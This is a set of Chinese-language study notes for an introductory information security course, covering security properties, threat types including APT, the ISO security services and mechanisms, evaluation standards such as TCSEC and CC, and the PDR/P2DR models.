 [TOC]

# 第1章 绪论

## 1.1 信息安全概述

### Safety和Security

1. #### Safety

防止由于自己的无意行为或者系统（或其他存在物）天生缺陷、失误、故障等造成的事故、伤害和损失。防意外。

可以通过对人员的培训、 教育，对系统（或其他存在物）的设计、制造和操作规程全过程的严格把关、科学优化等措施保障安全。

2. #### Security

防范来自于系统内部或外部故意的不良行为所可能造成的损失、伤害。防故意。

除了保障Safety的措施，还需要布置包括警卫、岗哨，部署防空袭力量，以及采取防间谍措施等，远远超出Safety的范围 。

### 安全的一般概念

> 安全是免除了不可接受的损害风险的状态。

**安全**是指不受威胁，没有危险、危害、损失（现代汉语词典）。从安全工程或者安全学的角度，可以认为：

- 安全是一个动态过程或状态，过程的趋势或状态是人和事物受到的伤害（包括身体的、精神的）或遭受的损失在当时人们可以接受的范围内；
- 安全是一种特定的技术状态，即满足一定安全技术指标要求的状态；
- 安全是人们的一种概念，即人和物不会受到伤害和损失的理想状态。

### 1.1.1 相关安全概念

#### 1. 计算机安全

**计算机安全**一般是指计算机设备（包括CPU、显示器、外设等）、操作系统、数据库、计算机场地、介质等各方面的安全。

- 电磁辐射窃听
- 软硬件系统后门、漏洞
- 恶意软件

#### 2. 网络安全

**网络安全（Networks Security）**关心的是网络体系结构、网络通信协议、网络配置和网络管理等方面的安全。

- 网络边界防护
- 网络协议漏洞
- 网络配置、网络管理漏洞

#### 3. 信息安全

**信息安全（Information Security）**，通常与信息系统安全是相同概念，关心的是信息的产生、存储、换、处理等过程中的安全。

- 信息泄露、窃取、伪造
- 非法访问

####   4. 网络空间安全

**网络空间安全（Cyberspace Security）**。网络空间是一个更宏大的概念。按照定义，网络空间包含了各类网络系统、计算机系统、各种嵌入式处理器和控制器，以及虚拟信息系统、人与人之间的关系等。

- 传统网络安全、信息安全
- 工业控制系统
- 人机系统

#### 5. 相互关系

> 一般认为，计算机安全是信息安全的基础，网络安全是信息安全的核心，而信息安全是网络空间安全的主要组成部分。

- **从广义的角度看**，由于信息系统包含了信息的收集、存储、传输、处理、交换等各个环节，因此信息安全范围完全包含了网络安全。即网络安全是信息安全的一个组成部分。
- **从狭义的角度看**，网络安全关注焦点集中在网络的架构、协议、配置和管理等方面。即网络安全更加注重的是信息在传输过程中机密性、完整性和可用性，而信息安全则是将关注焦点主要集中收集、存储、处理和交换等环节。

#### 信息安全包括

- 通信安全（COMSEC）
- 传输安全（TRANSEC）
- 计算机安全（COMPUSEC）
- 物理安全（Physical Security）
- 电磁辐射安全（TEMPEST）
- 人员安全（Personnel Security）

###  1.1.2 信息安全的相关属性(五大属性)

> 信息安全是以保护信息资产、防止信息被恶意泄露、修改和破坏为目的，通过相关技术，保证信息在各环节中的存储、传输和交换的机密（保密）性、完整性、可用性、不可否认性和可控性。

#### 1. 机密性（Confidentiality）

> 机密性，也称为保密性，是指私密的或机密的信息不能透露给非授权的个体。

- 信息的机密性依据信息被允许访问对象的多少而不同，所有人员都可以访问的信息为公开信息，需要限制访问的信息为敏感信息或秘密信息，根据信息的重要程度和保密要求将信息分为不同密级。
- 一般分为：公开、秘密、机密和绝密四个等级
- 已授权用户根据所授予的操作权限可以对保密信息进行操作。
- 机密性的保障技术主要包括：物理保密技术（监控、门禁等）、防电磁辐射泄露技术、网络防截获和防窃听技术、加密和解密技术等。

#### 2. 完整性（Integrity）

> 完整性包括数据完整性和系统完整性，其中：

- **数据完整性**：信息和程序只能按指定的且授权的方式修改；
- **系统完整性**：系统不能受到故意的或无意的非授权操作，必须不折不扣地执行预定的功能。

- 完整性一方面是保障在使用、传输、存储信息的过程中不发生篡改信息、丢失信息、错误信息等现象；另一方面是指信息处理的方法的正确性，执行不正当的操作，有可能造成重要文件的丢失，甚至整个系统的瘫痪。
- 完整性的保障技术主要包括：报文摘要、加密、数字签名等技术

#### 3. 可用性（Availability）

> 信息及相关的信息资产在授权人需要的时候，可以立即获得。例如，通信线路中断故障、网络的拥堵会造成信息在一段时间内不可用，影响正常的业务运营，就会造成对信息可用性的破坏。

- 系统必须及时地工作，不能拒绝向授权用户提供服务。
- 信息系统必须能适当地承受攻击并在失败时恢复。
- 可用性的保障技术主要包括：实时的备份与恢复、设备和线路冗余、集群和虚拟化等技术

#### 4. 可控性（Controllability）

> 如果任何主体（人/程序）都能不受限制的访问、更改、以及传播信息系统中的敏感信息，则一定是安全保障系统失去了效用，信息系统处于失控状态。

- 任何对信息的访问和对信息系统的使用都能得到有效的安全监控，防止对信息和信息系统的非法（非授权）利用。
- 信息安全的可控性不但涉及信息的可控性，还与安全产品、安全市场、安全厂商、安全研发人员的可控性紧密相关。
- 可控性的保障技术主要包括：基于PKI/PMI（公钥基础设施/授权管理基础设施）的访问控制技术

#### 5. 不可否认性（Non-repudiation）

保护用户免遭来自系统中其他合法用户的威胁，而不是来自攻击者的威胁。包括原发不可否认和接收不可否认：

- 原发不可否认用于防止发送者否认自己已发送的数据和数据内容；
- 接收不可否认用于防止接收者否认已接收过的数据和数据内容

- 不可否认性的保障技术主要包括：身份认证技术（包括数字签名、数字证书、IC或USBkey令牌、指纹、视网膜、掌形、脸形等）来保证。 

> **！CIA**： Confidentiality、Integrity、Availability

## 1.2 信息安全面临的威胁

​	安全威胁就是指由于自然的或人为的原因，使得信息资源的保密性、完整性、可用性、可控性和不可否认性等属性面临危险。

![安全威胁图](https://img.moxhub.cn/blog/image-20220507201437629.png)


### 1.2.1 自然的和人为的安全威胁

> 精心设计的人为攻击威胁最大

#### 1. 自然的安全威胁

有些安全威胁是不可抗拒的，称为自然的安全威胁，比如地震、火灾、战争等。对于这些安全威胁，最好的防范措施是建立适当的容灾备份系统。

#### 2. 人为的安全威胁

绝大部分安全威胁是由于人（或者间接是人）的原因造成的。又可以分为无意行为和故意行为。比如误操作、恶意攻击、病毒、木马等。

### 1.2.2 不同层次的安全威胁

- 国际标准化组织（ISO）在其提出了一个具有七层体系结构的《开放系统互联》参考模型（OSI/RM）。
- 由美国国防先进研究项目局（Defense Advanced Research Projects Agency）的卡恩和斯坦福的瑟夫所提出的TCP/IP四层体系结构成为事实上的标准。

| **OSI/RM** | **TCP/IP** | **安全威胁及处理措施**                                       |
| :--------: | :--------: | :----------------------------------------------------------: |
| 应用层     | 应用层     | 利用操作系统和网络协议上的漏洞进行的各种攻击。措施：加强安全服务，如安全协议、检测、加密等。 |
| 表示层       |应用层|同上文|
| 会话层      |应用层|同上文|
| 传输层     | 传输层     | 身份假冒、权限滥用、欺骗（IP和TCP）欺骗、路由侦听、重定向等。措施：实施安全控制技术，如身份认证、审计、网络管理等。 |
| 网络层     | 网际层     | 同上文 |
| 数据链路层 | 数据接口层 | 自然灾害、电磁辐射、数据监听、窃取、删除等。措施：物理安全技术，如容灾、屏蔽、监控等。 |
| 物理层     | 数据接口层 | 同上文 |

### 1.2.3 主动型和被动型安全威胁(重点)

> 根据**攻击者的行为特征**，人为故意的安全威胁还可以分为主动型的安全威胁和被动型的安全威胁。

#### 主动型安全威胁

> 主动型安全威胁是指击攻击者通过暴力行为或者利用相应漏洞实施恶意访问的故意行为。大部分的安全威胁都属于主动型，也相对比较容易发现。比较典型的主动型威胁包括：

1. ##### 伪装

​	伪装是一个实体假装成另外一个实体，通常与另一类主动攻击一起进行。假如，身份鉴别的序列被捕获，并在有效地身份鉴别发生时做出回答，有可能使具有很少特权的实体得到额外的特权。

2. ##### 重放

​	重放攻击包含数据单元的被动捕获，随之再重传这些数据，从而产生一个非授权的效果。

3. ##### 非法修改

​	修改报文攻击意味着合法报文的某些部分已被修改，或者报文的延迟和重新排序，从而产生非授权的效果。

4. ##### 拒绝服务

​	拒绝服务攻击是阻止或禁止通信设施的正常使用和管理。这种攻击可能针对专门的目标（如安全审计服务），抑制所有报文直接送到目的站；也可能破坏整个网络，使网络不可用或网络超负荷，从而降低网络性能。

5. ##### 非授权访问

​	没有经过同意，就使用网络或计算机资源被看作非授权访问，如有意避开系统访问控制机制，对网络设备及资源进行非正常使用，或擅自扩大权限，越权访问信息。

6. ##### 否认

​	和心理学领域一样，计算机领域中的否认也是不承认已经发生的对自己不利的事件，以逃避谴责和责任。

7. ##### 信息泄露

​	有意或无意的将需要保密的信息透露给无授权第三方。

8. ##### 特洛伊木马

​	特洛伊木马（trojan horse）简称“木马（wooden horse）”，名称来源于希腊神话，有“一经潜入，后患无穷”之意，其特点是伪装成一个实用程序，诱使用户将其安装在PC或者服务器上，暗中打开端口，向指定地点发送数据，或者进行其他破坏活动。

9. ##### 后门或陷门

​	后门或陷门是指可以不经安全检查进入系统的秘密入口。作为一种便于调试和测试程序的技术，已经合法地存在了很多年。但当被无所顾忌的滥用时，变成了威胁。

10. ##### 计算机病毒

​	计算机病毒，是指编制或者在计算机程序中插入的破坏计算机功能或者毁坏数据，影响计算机使用，并能自我复制的一组计算机指令或者程序代码。

#### 被动型安全威胁

> 被动型安全威胁主要是从事信息收集而不是进行主动的访问。相对主动型威胁，被动型威胁很难发现。被动攻击包括嗅探、流量分析等攻击方法。

1. ##### 嗅探

​	嗅探是指攻击者利用某些特殊的工具（如sniff）监听网络上正在传输的数据包，以此获取正在传输的信息。

2. ##### 流量分析

​	流量分析是指通过分析收集到的数据包流量的外在特征（如报文传输的频率、报文的长度、延迟抖动等），以便获得流量的类型、位置和标识等，为进一步的攻击提供依据。

> 被动型安全威胁很难发现，**但可以设法阻止**其成功。如：**报文加密**

### 1.2.4 高级持续性渗透攻击（重点）

> 高级持续性渗透攻击 （Advanced Persistent Threat, APT）已经成为**危害性最大的安全威胁**。

​	高级持续性渗透攻击是指组织(特别是政府)或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。

|          投入上的高级           | 技术上的高级 |
| :-----------------------------: | :----------: |
|       全面信息收集与获取        |   0DAY攻击   |
|       目标明确的工作分工        |   通道加密   |
| 社会工程学+物理方法相结合的方法 |              |

#### 鱼叉式网络钓鱼

**鱼叉式网络钓鱼**（Spear phishing）是一种被认为源于亚洲与东欧，针对特定目标进行攻击的网络钓鱼攻击，是APT攻击的一种主要形式。

锁定目标后，黑客假冒各种名义以电子邮件等方式向目标发送难辨真伪文档，诱使其上当，借机在其计算机上安装特洛伊木马或其他间谍软件，以窃取机密或进一步渗透的目的。

#### 水坑式攻击

**水坑式攻击**（Waterhole attacks）是近年来新起的一种APT攻击行为，是指黑客通过分析被攻击者的网络活动规律，寻找被攻击者经常访问的网站的弱点，先攻下该网站并植入攻击代码，等待被攻击者来访时实施攻击。

因为类似于自然界狩猎者通常在猎物必去的水边隐蔽等待猎物而得名。

##  1.3 信息安全体系结构



![](https://img.moxhub.cn/blog/%E5%9B%BE%E7%89%871.png)

### 1.3.1 安全服务

> 安全服务（也称为安全功能）是指为加强网络信息系统安全性和对抗网络攻击行为而采取的一系列技术措施。在ISO的标准中，安全服务被定义为以下几种：

#### 1. 鉴别

> 鉴别（Authentication,也称为认证）,目的是保证通信双方主体的真实性和通信数据的真实性。分为：标识鉴别和数据鉴别。

- 标识鉴别是对主体的识别和证明，用于防止第三者的冒名顶替；
- 数据鉴别是对客体的鉴别，主要检查主体对客体的负责性，防止冒名伪造的数据，鉴别数据源的合法性。包括：收发双方的真实性、数据源和数据目的地的真实性。

#### 2. 访问控制

> 访问控制（Access Control),防止系统资源被非授权使用的措施,保障系统的可控性。

- 通信双方都可以使用访问控制措施，也可以在通信链路上的某个中间位置进行访问控制。
- 可以在通信模型的多个层次上设置访问控制，在应用层、传输层和网络层上设置访问控制。

#### 3. 数据机密性

> 数据机密性（Confidentialiy）服务可以提供不同范围的数据加密服务，以防数据泄露。

防止泄露的措施包括：

- 连接机密性、无连接机密性、选择字段机密性、通信业务流机密性。

#### 4. 数据完整性

> 数据完整性（Integrity）服务用于保证所接受的数据未经复制、插入、篡改、重排或重放，主要用于防止非授权的篡改和破坏等行为。

- 对遭受一定程度毁坏的数据进行完整性恢复（即带恢复的数据完整性）。
- 数据完整性可用于一个消息流、单个消息或一个消息中所选字段。

#### 5. 不可否认性

> 不可否认（也称为抗否认，Nonrepudiation），用于防止通讯双方中某一方抵赖所传输的消息。

- **源发不可否认**：向数据接收者提供数据源的证据，防止发送者否认发送过这个数据；
- **接收不可否认**：向数据发送者提供数据已接收的证据，接收者事后不能否认曾收到此数据。 

#### 6.  OSI参考模型各层提供的主要安全服务（重点）

- **物理层**：提供连接机密性和（或）业务流机密性服务（这一层没有无连接服务）。

- **数据链路层**：提供连接机密性和无连接机密性服务（物理层以上不能提供完全的业务流机密性）。

- **网络层**：可以在一定程度上提供认证、访问控制、机密性（除了选择字段机密性）和完整性（除了可恢复的连接完整性、选择字段的连接完整性）服务。

- **运输层**：可以提供认证、访问控制、机密性（除了选择字段机密性、业务流机密性）和完整性（除了选择字段的连接完整性）服务。

- **会话层**：不提供安全服务。

- **表示层**：本身不提供完全服务。但其提供的设施可支持应用层向应用程序提供安全服务。所以，规定表示层

  设施支持基本的数据机密性服务，支持认证、完整性和抗否认服务。

- **应用层**：必须提供所有的安全服务，它是惟一能提供选择字段服务和抗否认服务的一层。

### 1.3.2 安全机制（重点）

> 安全机制是安全服务的技术实现手段。一种安全服务可以通过多个安全机制加以实现；同样地，一个安全机制也可以为多种安全服务的实现提供实现的措施。

在ISO标准中，安全机制分为两大类：

- **普遍安全机制**。不属于任何协议层或安全服务，包括**可信功能度、安全标记、事件检测、安全设计和安全恢复**等5种。
- **特定安全机制**。在某个或某几个协议层实现，共8种。分别是：

#### 1、加密机制

> 加密是信息安全的核心技术，是提供数据保密的最常用方法。加密技术不仅应用于数据的存储和传输的过程中，也常应用于程序运行过程中。可以在OSI模型的各个层次上加密。

- 按密钥类型分：有**对称密钥加密和非对称密钥加密**；
- 按密码体制分：有**序列密码和分组密码**。

#### 2、访问控制机制

> 访问控制机制是按事先确定的规则防止未经授权的用户或用户组非法使用系统资源。当一个主体（用户、程序或进程等）企图非法访问未经授权的客体（文件、程序或进程）资源时，访问控制机制将拒绝这一企图，并向审计系统报告，审计系统则发出报警并形成部分追踪审计日志。

- **自主访问控制**：用户可以向其他用户授予或回收自身所属（或创建）的对象（文件、数据表等）的访问操作权限。
- **强制访问控制**：用户对所有对象的访问操作权限由系统（通常是系统安全员）按照规则授权或回收。

#### 3、数据完整性机制

> 数据完整性包括两种形式：一种是**数据单元**的完整性，另一种是**数据单元序列**的完整性。

##### （1）数据单元完整性

数据单元完整性的目的是保证组成一个单元的数据不被破坏或奠改。保证数据单元完整性的一般方法：

- 发送实体在一个数据单元上加一个标记，这个标记通常就是数据本身的函数，如分组校验、密码校验函数，也可以是哈希函数。
- 接收实体采用相同函数计算接收到的数据的标记。
- 若通信双方的标记相同，则认为在传输过程中数据没有被墓改。

##### （2）数据单元序列完整性

数据单元序列的完整性是要求数据编号的连续性和时间标记的正确性，以防止假冒、丢失、重发、插入或修改数据。保证数据单元序列完整性的一般方法：

- 发送实体按照某种规则将数据分割成若干个按序列号编排的数据单元，并将编号与数据单元一起发送给接收实体。
- 接收实体按照原有的序列还原并能保持序列号的连续性和时间标记的正确性。

#### 4、数字签名机制

> 数字签名机制是对加密机制和数据完整性机制的重要补充，也是解决网络通信安全问题的有效方法。数字签名机制可解决下列问题：

- **否认**：包括发送方否认和接收方否认。
- **伪造**：接收方伪造来自发送方的数据。
- **冒充**：假冒其他用户身份收发信息。
- **篆改**：接收方私自更改发送方发出的信息。

#### 5、交换鉴别机制

> 交换鉴别机制是通过互相交换信息的方式来确认彼此的身份。用于交换鉴别的技术有：

- **口令鉴别**：通过提供和验证口令，实现一方向另一方证明自己的身份。
- **数据加密鉴别**：将交换的数据加密后进行传送，只有合法用户才能通过自己掌握的密钥解密，得出明文并确认发送方是掌握另一个密钥的人。在许多情况下，与时间标记、同步时钟、双方或三方“握手”、数字签名和公证机构等技术一起使用。
- **实物属性鉴别**：利用双方的固有特征或所拥有的生物或实物属性进行身份鉴别。如指纹、声谱、身份卡等。

#### 6、通信业务填充机制

> 通信业务填充机制主要是为对抗非授权者在线路上监听数据并对其进行流量和流向分析。采用的方法：

- 一般由保密装置在无信息传输时，连续发出伪随机序列，使得非授权者无法判断哪些是有用信息、哪些是无用信息，从而无法通过流量分析方法窃取有用的信息。

- 通过填充机制可以掩盖通信的频度、报文的长度、报文的格式和报文的地址等，一般采用链路加密方式。

#### 7、路由控制机制

> 在一个大型网络中，从源节点到目的节点可能有多条线路，有些线路可能是安全的，而另一些线路是不安全的。路由控制机制可使信息发送者选择特殊的路由，以保证数据安全。

#### 8、公证机制

在大型网络中，有许多节点或端节点。由于：

- 不能保证所有节点及实体的真实性和可信性；
- 无法明确区分造成信息丢失、破坏或延迟等的责任问题。

公证机制是为了解决相互不信任主体间的通信问题。同时也可以解决由于设备故障等技术原因造成的信息丢失、破坏或延迟等有关责任问题。一般方法：

- 设立公正机构：通信双方共同确定一个双方公认的第三方作为公正机构
- 通信双方进行的所有数据通信，均必须经过这个机构来中转，以确保公证机构能得到必要的信息，供以后仲裁。
- 显然，首先需要解决公证机构本身的安全可靠性和诚实可信度。

### 1.3.3 安全服务与安全机制之间的关系

> 注意：每一种安全服务既可以由一种安全机制提供，也可以由几种安全机制联合提供。

## 1.4 信息安全评估标准

### 1.4.1  可信计算机系统评估准则

> 1980年代中期，美国国防部颁布了被称为《彩虹系列》的一系列与可信计算相关的规则。其中的橘皮书定义了全球第一个可信计算机评估准则（Trusted Computer System Evaluation Criteria，TCSEC）。TCSEC对后来的信息安全评估标准的建立起了重要参考作用。

#### 1.可信计算基

​	TCSEC提出了可信计算基（Trusted Computer Base,TCB)的概念，并把TCB作为系统安全的基础，掀起了可信计算的第一次高潮。在TCSEC中，TCB是实施系统安全策略时必须信任和依赖的软件（通常是操作系统内核）、硬件、固件和人等。包括：

1. 操作系统的安全内核。
2. 具有特权的程序和命令。
3. 处理敏感信息的程序，如系统管理命令等。
4. 与TCB实施安全策略有关的文件。
5. 其他有关的固件、硬件和设备。固件和硬件故障可能引起信息的丢失、改变或产生违反安全策略的事件。因此把安全操作系统中的固件和硬件也作为TCB的一部分来看待。
6. 负责系统管理的人员。由于系统管理员的误操作或恶意操作也会引起系统的安全性问题，因此他们也被看作TCB的一部分。
7. 保障固件和硬件正确的程序和诊断软件。

#### 2. TCSEC的安全级别

根据安全性相近原则，TCSEC规定四类安全级别共计**七个安全等级**：

- D类：没有什么保护要求；
- C类：包括C1和C2级，目前流行的商用操作系统，有一定的保护要求；
- B类：包括B1、B2、B3级，要求对基础模型的安全性给出精确证明，TCB有清楚的技术规范说明；
- A类：要求更精确证明TCB和形式化设计
- 其中B1和B2的安全强度有明显区别，B2和B3之间也有显著差别。

##### （1） D类-无保护级

> 指未加任何实际安全措施，整个系统都不可信任。

- 只为文件和用户提供安全保护，操作系统很容易受到损害。
- 任何人不需要账户就可进入系统，不受任何限制就可访问他人文件。
- 最普遍形式是本地操作系统，或一个完全没有保护的网络。
- 不能在多用户环境下处理敏感信息。

##### （2） C类--自主访问控制（重点）

> 具有一定的保护能力，采用的措施是自主访问控制和审计跟踪。有C1和C2两个级别。一般只适用于具有一定等级的多用户环境，具有对主体责任及其动作审计的能力。



① C1级：也称为自主安全保护级，具有一定自主访问控制（DAC)机制，通过将用户和数据分开达到安全目的。
- 要求系统硬件有一定的安全保护。
- 用户使用前必须登录系统，允许管理员为一些程序和数据设定访问权限。
- 不能控制进入系统的用户访问级别，所有文档具有相同的机密性。

②C2级：又称为访问控制保护，具有更细粒度的DAC机制。

- 引入审计机制，并对审计使用身份认证。
- 通过注册过程控制、审计安全相关事件以及资源隔离，使单个用户为其行为负责

##### （3）B类--强制访问控制（重点）

- B1级：满足C2级的所有要求，对象还必须在强制访问控制之下，不允许拥有者更改它们的权限。
- B2级：基于明确定义的形式化模型，所有主体和客体实施MAC。要求系统中的所有对象加标签，具有可信通路机制、系统结构化设计、最小特权管理及对隐藏通道的分析处理。
- B3级：对系统中所有主体和客体的访问进行控制，不会被非法篆改。

##### （4）A类一形式化证明的安全

> 类似于B3级，包括一个严格的设计、控制和验证过程。目前只有A1级别。

- 设计必须是从数学角度经过验证的。
- 特色在于形式化的顶层设计规格（FTDS)、形式化验证与形式化模型的一致性和由此带来的更高的可信度。

TCSEC将计算机系统的安全划分为**四个等级、七个安全级别**：

![image-20220508165643457](https://img.moxhub.cn/blog/image-20220508165643457.png)

### 1.4.2 信息技术安全评价通用准则

#### 1.CC的基本组成

> CC主要由三部分组成，分别是：简介和一般模型、安全功能要求和安全保证要求。

- 简介和一般模型：正文介绍了CC中的有关术语、基本概念和一般模型以及与评估有关的一些框架，附录部分主要介绍保护轮廓（PP)和安全目标（ST)的基本内容。
- 安全功能要求：按“类一族一组件”的方式提出安全功能要求，提供了表示评估对象TOE(target of evaluation)安全功能要求的标准方法。除正文以外，每一个类还有对应的提示性附录作进一步解释。
- 安全保证要求：定义了评估保证级别，介绍了PP(保护轮廓）和ST(安全目标）的评估，并按“类一族一组件”的方式提出安全保证要求。

#### 2.评估保证级别

> CC设计了7个评估保证级（EAL),从EAL1-EAL7,共7个等级。

#### 3.CC的特点

CC的特点可以归纳为：

- 提供了一种通用的方法，即给出通用的表达方式。如果用户、开发者、评估者、认可者等目标读者都通过CC语言，互相沟通和理解：
- 用户使用CC语言可以更加明确的表述自己的安全需求；
- 开发者可以有针对性地描述产品和系统的安全性；
- 评估者可更加有效客观地进行评估，并确保评估结果对用户而言更容易理解；
- 具有内在完备性和实用性的特点，具体体现在“保护轮廓”PP和“安全目标”ST的编制上。
- “保护轮廓”PP主要用于表达一类产品或系统的用户需求，在标准化体系中可以作为安全技术类标准对待。

### 1.4.3 我国的信息安全评估准则

#### 1、第一级（用户自主保护级）

对用户实施自主访问控制，保护用户信息免受破坏。适用于一般的信息和信息系统，其受到破坏后，会对公民、法人和其他组织的合法权益造成一定损害，但不损害国家安全、社会秩序和公共利益。

- 计算机信息系统可信计算基通过隔离用户与数据，使用户具备自主安全保护的能力。
- 具有多种形式的控制能力，对用户实施自主访问控制，即为用户提供可行的手段，保护用户和用户组信息，避免其他用户对数据的非法读写与破坏。

#### 2、第二级（系统审计保护级）

信息系统受到破坏后，会对公民、法人和其他组织的合法权益产生严重损害，或者对社会秩序和公共利益造成损害，但不损害国家安全。

- 实施了粒度更细的自主访问控制。
- 通过登录规程、审计安全性相关事件和隔离资源，使用户对自己的行为负责。

#### 3、第三级（安全标记保护级）

信息系统受到破坏后，会对社会秩序和公共利益造成严重损害，或者国家安全造成损害。

- 具有系统审计保护级所有功能。
- 提供有关安全策略模型、数据标记以及主体对客体强制访问控制的非形式化描述。
- 具有准确地标记输出信息的能力。
- 能够消除通过测试发现的任何错误。

#### 4、第四级（结构化保护级）

信息系统受到破坏后，会对社会秩序和公共利益造成特别严重损害，或者对国家安全造成严重损害。

- 有一个明确定义的形式化安全策略模型。
- 对主体和客体中的关键元素实施强制访问控制。
- 对主体和客体中的非关键元素实施自主访问控制。
- 能够防止隐蔽通道。
- 百强化的鉴别机制。
- 明确定义的接口，以便进行充分的测试和审查。
- 强化的抗渗透能力。

#### 5、第五级（访问验证保护级）

信息系统受到破坏后，会对国家安全造成特别严重损害。

- 能满足访问监控器需求。
- 访问监控器仲裁主体对客体的全部访问。
- 访问监控器具有抗墓改能力。
- 支持安全管理员职能。
- 扩充审计机制。
- 提供系统恢复机制。
- 具有很高的抗渗透能力。

![image-20220508170528022](https://img.moxhub.cn/blog/image-20220508170528022.png)

## 1.5 信息安全发展历程及趋势

> 信息安全大致经历了通**信保密（通信安全）、信息安全（计算机安全）、信息保障**3个发展阶段。

### 1.5.1 通信保密阶段

### 1.5.2 信息安全阶段

#### 1.加密算法

非对称加密方法的出现带来了巨大的影响，甚至可以说是革命性的影响。特别是带来了一种新的安全属性：不可否认性，或称为抗抵赖性。

传统抗抵赖基本依靠验笔迹、骑缝章、骑缝签名等方法，这些方法无法应用到数字媒介上。非对称加密方法的出现为抗抵赖提供了可能，这就是数字签名。

如果公开解密密钥，并用不公开的加密密钥对信息进行加密后发布，则信息接收方可用公钥进行解密，从而可以验证持有私钥方发布信息的完整性，以及确认该信息确实是私钥持有者所发送。这里，私钥被称作数字签名，而公钥就是数字证书。

#### 2. 经典的安全模型

密码学、访问控制技术、信息系统安全模型及评价的理论和技术等得到了很大发展。以上述技术为基础构建安全防范体系成为当时的主流。

![image-20220508170827959](https://img.moxhub.cn/blog/image-20220508170827959.png)

### 1.5.3 信息保障阶段

#### 1.基于时间的动态模型（重点）

##### PDR模型

> 美国互联网安全系统公司（ISS)提出的基于时间的安全模型，也是全球第一个体现了主动防御思想的安全模型，即保护一检测一响应(Protection-Detection-Response,PDR)模型。

PDR模型认为：

- 信息系统中不可避免存在各种漏洞，这些漏洞本身不会对信息系统造成损害，但是一旦被利用就会成为系统的威胁。
- 任何安全防护措施都与时间相关。如果给予无限的时间，任何防护措施都能够被攻破。

PDR模型定义以下几个时间变量：

- 防护时间Pt:黑客发起攻击时，保护系统不被攻破的时间，即可以抵御攻击的时间。

- 检测时间Dt:从黑客发起攻击到检测系统发现被攻击的时间。

- 响应时间Rt:从发现攻击到安全系统作出有效响应的时间。

> PDR模型认为：若Pt>D++Rt则认为系统是安全的。

![image-20220508171044732](https://img.moxhub.cn/blog/image-20220508171044732.png)

##### PDR模型中的保护（Protection)

保护是安全的第一步。为此，需要制定安全规则。

- 安全规则：以安全策略规则的基础上进一步的细化。
- 系统充安全的配置：针对现有的网络环境的系统配置，安装各种必要的补丁，提高安全策略级别。
- 安全措施的采用：安装防火墙（软/硬）。

##### PDR模型中的检测（Detection)

再完美的安全防御措施都无法确保系统100%的安全。昨天的补丁可能会在今天发现新的漏洞。因此，需要开展实时监控。

- 异常临视：系统发生不正常情况。

  > 如：服务停止，无法正常登陆，服务状态不稳定等。

- 模式发现：对已知攻击的模式进行发现。

##### IPDR模型中的响应（Response)

在发现了攻击企图或者攻击之后，需要系统及时地进行反应：

- 报告：无论系统的自动化程度多高，都需要让管理员知道是否有入侵事件发生。
- 记录：必须将所有的情况记录下来，包括入侵的各个细节以及系统做出的反应（尽最大可能）。
- 反应：进行相应的处理以阻止进一步的入侵。
- 恢复：清除入侵造成的影响，使系统正常运行。
- 因此，响应也就意味着开展了某种程度的进一步防护。

##### PDR模型的优点

给出了新的安全观，指明了方向（即提高Pt,减少Dt和Rt),直观、实用。PDR模型的出现直接推动了入侵检测技术的发展。

##### IPDR模型的缺点

各个时间的测量比较困难，而且对各种安全威胁的应对模式相对固定，无法适应瞬息万变的网络实际状况。

##### PPDR模型

> PDR模型的提出在信息安全领域得到了巨大的反响，推动了基于时间因素的主动安全研究的潮流，出现了一大批以PDR模型为基础的研究成果，如：PPDR、PDRR、MPPDRR等。
>
> PPDR模型（Policy-Protection-Detection-- Response，PPDR，也称为P2DR）模型。

和PDR不同，P2DR强调在防护、检测和响应的各个环节都要依据安全策略进行实施。

![image-20220508171556545](https://img.moxhub.cn/blog/image-20220508171556545.png)

在PPDR模型中：

- 策略：指的是信息系统的安全策略，包括访问控制策略、加密通信策略、身份认证策略、备份恢复策略等。策略体系的建立包括安全策略的制定、评估与执行等；
- 防护：指的是通过部署和采用安全技术来提高网络的防护能力，如访问控制、防火墙、入侵检测、加密技术、身份认证等技术；
- 检测：指的是利用信息安全检测工具，监视、分析、审计网络活动，了解判断网络系统的安全状态。检测这一环节，使安全防护从被动防护演进到主动防御，是整个模型动态性的体现。主要方法包括：实时监控、检测、报警等；
- 响应：指的是在检测到安全漏洞和安全事件时，通过及时的响应措施将网络系统的安全性调整到风险最低的状态，包括恢复系统功能和数据，启动备份系统等。其主要方法包括：关闭服务、跟踪、反击、消除影响等。

> 和PDR模型一样，P2DR模型中也有若干个与时间相关的定义，分别是：Pt(防护时间）、Dt(检测时间）、Rt(反应时间）,并且还定义了一个暴露时间Et

- 暴露时间时Et：从系统被攻击成功到采取有效措施将系统恢复正常之间的时间跨度。即，系统完全暴露在攻击者眼前的时间长度。

> 因此，若：Pt>Dt+Rt,则系统是安全的
> 若Pt<Dt+Rt,则：Et=(Dt+Rt)-Pt

##### P2DR模型的核心思想

在统一安全策略的控制下，以综合运用防护工具为基础，利用检测工具检测评估网络系统的安全状态，通过及时的响应措施将网络系统调整到风险最低的安全状态。

与PDR模型相比，P2DR模型更强调控制和对抗，即强调系统安全的动态性,并且以安全检测、漏洞监测和自适应填充“安全间隙”为循环来提高网络安全。

在P2DR模型中，考虑了管理因素，强调安全管理的持续性、安全策略的动态性，以实时监视网络活动、发现威胁和弱点来调整和填补网络漏洞。

另外，P2DR模型强调检测的重要性，通过经常对网络系统的评估把握系统风险点，及时弱化甚至消除系统的安全漏洞。

##### P2DR模型的优点

给出了一个安全的新视角：“及时的检测和响应就是安全”，“及时的检测和恢复就是安全”，从而为解决安全问题明确了方向，即：提高系统的防护时间Pt,降低检测时间Dt和响应时间Rt

##### P2DR模型的缺点

忽略了内在的变化因素.如人员的流动、人员的素质和策略贯彻的不稳定性。

#### 2. 信息保障技术框架

> 1998年10月，美国美国安全局发布了“信息保障技术框架（InformationAssurance Technical Framework:IATF)”1.1版本，并在以后的几年中陆续不断发布了更加完善的版本。

##### (1)IATF的核心思想

IATF的信息保障核心思想是纵深防御战略（Defense in Depth)。所谓深层防御战略是指采用多层次、纵深的安全措施来保障用户信息及信息系统的安全。

在纵深防御战略中，人、技术和操作是三个主要核心要素，要保障信息及信息系统的安全，三者缺一不可。

在这个策略的三个核心要素中，IATF强调技术并提供一个框架进行多层保护，以此防范计算机威胁。深度防御方法能够攻破一层或一类保护的攻击行为无法破坏整个信息基础设施。

##### (2)IATF的信息安全原则

- 多点保护。包括保护网络和基础设施、区域边界、计算环境等，即在信息系统的各个方位布置全面的防御机制，将风险减至最低。

